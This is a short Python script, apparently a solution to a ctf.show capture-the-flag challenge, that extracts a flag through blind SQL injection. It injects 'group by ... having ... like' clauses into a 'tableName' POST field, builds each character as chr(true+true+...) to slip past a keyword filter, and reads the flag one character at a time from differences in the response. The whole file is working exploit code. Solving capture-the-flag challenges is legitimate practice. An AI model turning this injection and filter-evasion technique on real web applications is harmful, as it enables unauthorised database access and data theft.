import requests
import sys

def createNum(n):
    num = "true"
    if n == 1:
        return "true"
    else:
        for i in range(n - 1):
            num += "+true"
    return num


def createstrNum(m):
    _str = ""
    for j in m:
        _str += ",chr(" + createNum(ord(j)) + ")"
    return _str[1:]


url = "http://6a7fd11b-0a3f-42d6-bcff-2a0f1b003d21.challenge.ctf.show/select-waf.php"
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"
for i in range(100):
    for j in letter:
        data = {
            'tableName': 'ctfshow_user group by pass having pass like concat({})'.format(createstrNum(flag + j + "%"))
        }
        res = requests.post(url=url, data=data).text
        # print(res)
        if "$user_count = 1;" in res:
            flag += j
            print(flag)
            break
        if j == "}":
            sys.exit()
